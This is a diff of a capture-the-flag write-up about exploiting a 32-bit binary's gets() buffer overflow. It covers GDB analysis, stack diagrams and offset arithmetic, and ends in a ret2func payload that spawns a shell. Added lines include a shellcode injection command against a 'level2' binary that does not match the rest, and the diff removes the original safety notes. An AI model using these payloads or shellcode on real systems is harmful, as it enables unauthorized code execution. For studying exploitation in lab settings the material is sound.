@@ -1,63 +1,142 @@
-# Level 1 - Buffer Overflow via `gets()`
+command: (python -c 'print "\x90"*40 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*19 + "\xcf\x84\x04\x08"'; cat) | ./level2
 
-## Vulnerability Summary
+=== Analysis ===
 
-The program uses `gets()` to read input into a 64-byte buffer. Since `gets()` has no bounds checking, sending more than 64 bytes causes a **stack buffer overflow** that overwrites the return address.
+1. Ran "info functions" in GDB and found a suspicious
+   function called "run" at address 0x08048444 that
+   is never called by main.
 
-## Assembly Key Instructions
+2. Disassembled run() and found:
+   - calls fwrite() → prints "Good... Wait what?"
+   - calls system("/bin/sh") → opens a shell as level2
 
-```
-0x08048486 <+6>:     sub    $0x50,%esp            ; Allocate 80 bytes on stack
-0x08048489 <+9>:     lea    0x10(%esp),%eax       ; Buffer at ESP + 0x10 (64 bytes available)
-0x0804848d <+13>:    mov    %eax,(%esp)           ; Pass buffer to gets()
-0x08048490 <+16>:    call   0x8048340 <gets@plt>  ; gets() - unbounded read!
-```
+3. Disassembled main() and found:
+   - sub $0x50,%esp → allocates 80 bytes on stack
+   - lea 0x10(%esp),%eax → buffer starts 16 bytes from esp
+   - calls gets() → no size limit → buffer overflow vulnerability
+   - actual buffer size: 0x50 - 0x10 = 0x40 = 64 bytes
 
-**Buffer layout on stack:**
-- Bytes 0–63: User input buffer
-- Bytes 64–67: Saved %ebp
-- Bytes 68–71: Return address ← **Can be overwritten**
-
-## How to Exploit
-
-Send input longer than 64 bytes to overflow and hijack the return address:
-
-```bash
-# Create payload: 64 bytes padding + 4 bytes for %ebp + new return address
-(python -c 'print "Q" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
-```
-
-**Steps:**
-1. Find target address (e.g., `system()` address or ROP gadget) with gdb
-2. Calculate offset: 64 (buffer) + 4 (saved %ebp) = 68 bytes
-3. Build payload: `[68 bytes padding] + [4-byte target address]`
-4. Pipe to the binary to trigger execution
-
-## Stack Memory Layout
-
-**Before Overflow (Normal):**
-```
-High Memory (Top)
-↓
-[Return Address (EIP)]      ← Where CPU jumps after function ends
-[Saved EBP (4 bytes)]       ← Base pointer for local variables
-[Padding (variable)]        ← Alignment bytes from compiler
-[Buffer (64 bytes)]         ← Input from gets()
-↑
-Low Memory (Bottom)
-```
-
-**After Overflow (Exploited):**
-```
-[0x08048444 (run address)]  ← New target: CPU jumps here instead
-[Q Q Q Q Q Q Q Q...]        ← 76 bytes of padding (Q characters)
-[Q Q Q Q Q Q Q Q...]
-[Q Q Q Q Q Q Q Q...]
-```
+=== Stack Layout ===
 
 
-## Key Points
+High addresses
+┌─────────────────────┐
+│ return address      │  4 bytes
+├─────────────────────┤
+│ saved EBP           │  4 bytes
+├─────────────────────┤
+│ 8 bytes (padding)   │  ← The compiler needed the total frame to be 88 bytes for alignment. (ebp - esp to calculate)
+├─────────────────────┤
+│                     │
+|  buffer (64 bytes)  │
+│                     │
+├─────────────────────┤
+│ 16 bytes (padding)  │  ← below buffer offset padding;
+└─────────────────────┘
+Low addresses  ← esp points here, stack grows this way (top of the stack)  
 
-- `gets()` is unsafe and removed from modern C — use `fgets()` or `read()` instead
-- Check binary protections with `checksec` (ASLR, canaries may block this)
-- Only test on systems you own or authorized challenge environments	
+-------------------------------------------------------------
+ps : ESP = 0xbffff6d0 points to the top of the stack        |
+That address is low compared to the data above it           |
+“Top” does NOT mean “highest address”                       |
+                                                            |
+-> Stack growth (allocation)                                |
+                                                            |
+This happens when the program reserves space for locals:    |
+Stack grows downward → allocation phase                     |
+Buffer writes go upward → data writing phase                |
+                                                            |
+They are independent directions                             |
+                                                            |
+New buffer space is created below                           |
+EBP and return address don’t move                           |
+They stay at higher addresses                               |
+-------------------------------------------------------------
+
+ps: It feels completely backward, doesn''t it? In the real world, 
+when you stack plates, the "top" gets higher and higher in the air. 
+But in computer architecture, the top of the stack is at a lower numerical memory address.
+
+=== Exploit Calculation ===
+
+To reach return address:
+- 72 bytes → fill buffer and space up to EBP
+-  4 bytes → overwrite saved EBP
+= 76 bytes before return address
+
+=== Address ===
+
+run() address:       0x08048444
+Little endian:       \x44\x84\x04\x08
+(x86 stores addresses with least significant byte first)
+
+=== Payload ===
+
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+
+- "A" * 76  → fills buffer + EBP (76 bytes of junk)
+- \x44\x84\x04\x08 → address of run() in little endian
+- cat → keeps stdin open so shell stays interactive
+
+=== Result ===
+
+Program jumps to run() → calls system("/bin/sh")
+→ interactive shell as level2
+→ cat /home/user/level2/.pass → [password]
+
+=== Note ===
+
+Shellcode injection is also a valid solution here
+since NX is disabled for this binary.
+ret2func was chosen for simplicity.
+
+=================================== steps to verify calculation ================================
+
+Step 1 — set breakpoint BEFORE running:
+bash(gdb) break main
+You should see:
+Breakpoint 1 at 0x08048483
+
+Step 2 — now run the program:
+bash(gdb) run
+Program will STOP at main — you''ll see:
+Breakpoint 1, 0x08048483 in main ()
+
+step3: 
+ni
+ni
+ni
+ni
+ni (reach gets function) -> fill with some content
+
+Step 4 — now check registers:
+bash(gdb) info registers esp ebp
+
+Step 4 — view stack memory:
+bash(gdb) x/80x $esp
+
+=============== STACK PRESENTATION ===============
+
+TOP (LOWER ADDRESS)
+
+------------------------------------------------+
+C()                                             |
+------------------------------------------------|
+B()                                             |
+------------------------------------------------|
+A()                                             |
+------------------------------------------------|
+MAIN''S STACK FRAME                             |
+------------------------------------------------|
+4- LOCAL VARIABLES (int a, char buffer[64],...) |
+                                                |
+3- SAVED EBP                                    |
+                                                |
+2- RETURN ADDRESS                               |
+                                                |
+1- FUNCTION ARGUMENTS                           |
+------------------------------------------------|
+MAIN()                                          |
+------------------------------------------------+
+
+BOTTOM (HIGH ADDRESSES)
